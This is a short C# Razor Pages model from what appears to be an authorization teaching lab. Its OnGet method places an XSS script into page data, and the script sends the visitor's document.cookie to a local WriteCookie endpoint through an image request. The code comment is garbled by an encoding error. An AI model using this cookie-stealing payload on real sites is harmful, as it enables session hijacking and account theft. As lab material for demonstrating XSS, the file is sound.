using Microsoft.AspNetCore.Mvc.RazorPages;

namespace AuthorizationBaseLab.Pages
{
    public class XssModel : PageModel
    {
        public void OnGet()
        {
            // ģ�ⱻ����ע�����ű������ظ�ǰ��ҳ��
            ViewData["xss"] = "<p><script>let img = document.createElement('img');img.src = 'https://localhost:7272/Xss/WriteCookie?cookie=' + encodeURIComponent(document.cookie);document.body.appendChild(img);</script></p>";
        }
    }
}
